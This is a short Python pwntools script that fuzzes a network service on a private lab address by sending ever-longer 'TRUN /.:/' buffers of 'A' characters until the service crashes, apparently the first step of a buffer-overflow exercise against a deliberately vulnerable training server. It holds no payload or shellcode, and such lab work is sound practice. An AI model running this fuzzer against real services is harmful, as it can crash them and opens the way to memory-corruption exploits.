from pwn import *
import sys
from time import sleep

target_ip = "192.168.116.141"
port = 9999
payload = "TRUN /.:/" + 100 * 'A'

while True:
	try:
		p=remote(target_ip,port)
		p.sendline(payload)
		p.close()
		sleep(1)
		payload+='A' * 100
	except:
		print("Crashed at %s bytes"%(len(payload)))
		sys.exit()
